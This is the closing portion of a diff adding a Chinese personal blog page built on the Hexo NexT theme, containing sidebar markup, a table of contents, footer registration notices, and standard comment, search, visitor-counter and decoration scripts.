+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar/1.jpg" alt="pikachu">
+          <p class="site-author-name" itemprop="name">pikachu</p>
+          <p class="site-description motion-element" itemprop="description">帅 | 码渣 | 宅 | 金木粉</p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">59</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hitcxy" target="_blank" rel="external nofollow noopener noreferrer" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow noopener noreferrer">
+              <img src="/images/cc-by-sa.svg" alt="Creative Commons">
+            </a>
+          </div>
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              参考的博客
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://yangbingdong.com/" title="ookamiAntD" target="_blank" rel="external nofollow noopener noreferrer">ookamiAntD</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        <div id="days"></div>
+    <script>
+    function show_date_time(){
+        window.setTimeout("show_date_time()", 1000);
+        BirthDay=new Date("09/16/2019 21:51:10");
+        today=new Date();
+        timeold=(today.getTime()-BirthDay.getTime());
+        sectimeold=timeold/1000
+        secondsold=Math.floor(sectimeold);
+        msPerDay=24*60*60*1000
+        e_daysold=timeold/msPerDay
+        daysold=Math.floor(e_daysold);
+        e_hrsold=(e_daysold-daysold)*24;
+        hrsold=setzero(Math.floor(e_hrsold));
+        e_minsold=(e_hrsold-hrsold)*60;
+        minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+        seconds=setzero(Math.floor((e_minsold-minsold)*60));
+        document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+    }
+function setzero(i){
+    if (i<10)
+    {i="0" + i};
+    return i;
+}
+show_date_time();
+</script>
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Analyse"><span class="nav-number">1.</span> <span class="nav-text">Analyse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exp-1"><span class="nav-number">2.</span> <span class="nav-text">Exp 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exp-2"><span class="nav-number">3.</span> <span class="nav-text">Exp 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exp-3"><span class="nav-number">4.</span> <span class="nav-text">Exp 3</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+	<!-- <img style="position: absolute;top: 0;left: 15%;border: 0;width: 200px;height: 200px;" src="http://ojoba1c98.bkt.clouddn.com/img/coding-flag.png" alt="Coding Flag"> -->
+      <div class="footer-inner">
+        
+
+<div class="busuanzi-count">
+
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user">本站访客数</i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span>人次</span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye">本站总访问量</i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span>次</span>
+  
+  
+</div>
+
+
+
+        <div class="copyright">
+  
+  &copy;  2019 - 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-flash"></i>
+  </span> | <span class="post-count">共43.6k字</span>
+</div>
+
+
+<!-- <div class="theme-info">
+  由  强力驱动
+</div> --!>
+
+<div style="width:300px;margin:0 auto;">
+  <a target="_blank" href="http://www.beian.miit.gov.cn/" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
+    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖ICP备20013338号</p>
+  </a>
+</div>
+
+<div style="width:300px;margin:0 auto;">
+  <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=34122102000129" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
+    <img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/beian.png" style="float:left;"/>
+    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖公网安备 34122102000129号</p>
+  </a>
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="/js/src/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    new Valine({
+        lang: 'zh-cn',
+        admin_email: '757610839@qq.com',
+        el: '#comments' ,
+        appId: '8Irorb3IRbCGqRd9obk9KD98-gzGzoHsz',
+        appKey: 'DCF1KCbdAOySKCu1Ooc0J5ku',
+        emoticon_url: 'https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/gif/',
+        emoticon_list: ["弹肚皮.gif","动次打次.gif","抖脚脚.gif","慌张.gif","夹住.gif","开车.gif","抖眼镜.gif","吃东西.gif","动耳朵.gif","哭唧唧.gif","小花花.gif","眨眼.gif","跳舞.gif","风吹秀发.gif","摇头.gif","眼睛转.gif","跳着走.gif","抖眼.gif","绿色的.gif","我走了.gif","浪起来.gif","打篮球.gif","都是小心心.gif","比心心.gif","吹风.gif","吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+        placeholder: '点击此处填写昵称和邮箱才能留言噢~',
+  });
+  </script>
+
+
+
+
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("8Irorb3IRbCGqRd9obk9KD98-gzGzoHsz", "DCF1KCbdAOySKCu1Ooc0J5ku");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+  <script type="text/javascript" color="255,0,204" opacity='0.5' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+
+
+
+
+
+<!--卖萌-->
+<script type="text/javascript" src="/js/src/dytitle.js"></script>
+</div></footer></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"superSample":2,"width":200,"height":300,"position":"left"},"mobile":{"show":true},"react":{"opacityDefault":0.9,"opacityOnHover":0.5},"log":false});</script></body>
+</html>
